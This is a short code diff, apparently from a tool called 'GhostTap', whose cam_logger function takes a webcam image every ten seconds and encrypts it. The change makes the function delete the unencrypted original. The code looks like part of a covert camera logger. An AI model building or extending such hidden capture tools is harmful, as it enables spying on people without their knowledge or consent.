@@ -18,7 +18,7 @@ def cam_logger():
                 cv2.imwrite(filename, frame) # save image
                 encrypted_filename = f"{filename}.enc" # add encrypted file
                 encrypt_file(filename, encrypted_filename) # encrypt function
-                #os.remove(filename) # remove original .jpg
+                os.remove(filename) # remove original .jpg
                 time.sleep(10) # wait 10 seconds every save
     except KeyboardInterrupt: # ctrl + c interrupt
         print("GhostTap cam_logger stopped.")
